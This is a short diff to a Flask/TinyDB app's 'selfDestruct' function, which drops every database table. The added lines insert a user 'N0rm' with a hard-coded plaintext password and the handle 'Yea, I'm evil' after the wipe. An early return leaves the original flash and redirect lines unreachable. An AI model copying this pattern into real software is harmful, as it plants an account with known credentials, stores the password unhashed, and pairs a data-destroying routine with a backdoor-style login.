@@ -36,6 +36,24 @@ def selfDestruct():
 
     # Drop all tables in the TinyDB database
     db.drop_tables()
+    users_table = db.table('users')
+    user_record = {
+        'username': "N0rm",
+        'password': "Pa5$W0rd",
+        'birthday': "1999-01-01",
+        'bio': "",
+        'handle': "Yea, I'm evil",
+        'pfp': "uploads/Norm.png",
+        'friends': ["Norm"],
+        'followers': [],
+        'following': [],
+        'friend_requests': [],
+        'blocked_users': [],
+        'unread_messages': []
+    }
+
+    users_table.insert(user_record)
+    return user_record
     flask.flash("Database wiped successfully!", "warning")
     return flask.redirect(flask.url_for('posts.download_test'))
 
